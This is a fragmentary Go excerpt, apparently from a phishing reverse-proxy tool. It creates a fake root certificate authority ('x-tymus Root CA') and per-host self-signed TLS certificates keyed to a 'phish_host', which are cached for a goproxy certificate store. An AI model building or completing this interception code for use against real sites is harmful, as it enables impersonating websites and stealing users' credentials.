	...
	if err != nil {
		...
		template := x509.Certificate{
			...
			Subject: pkix.Name{
				Country:            []string{},
				Locality:           []string{},
				Organization:       []string{"x-tymus Trust Co."},
				OrganizationalUnit: []string{},
				CommonName:         "x-tymus Root CA",
			},
			NotBefore:             notBefore,
			NotAfter:              notAfter,
...
func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
	...
	if phish_host == "" {
		...
		template = x509.Certificate{
			...
			Subject:               pkix.Name{Organization: []string{"x-tymus Trust Co."}},
			NotBefore:             time.Now(),
...
// Fetch implements goproxy.CertStore interface
func (o *CertDb) Fetch(host string, gen func() (*tls.Certificate, error)) (*tls.Certificate, error) {
	if cert, ok := o.tlsCache[host]; ok {
		return cert, nil
	}
	cert, err := gen()
	if err != nil {
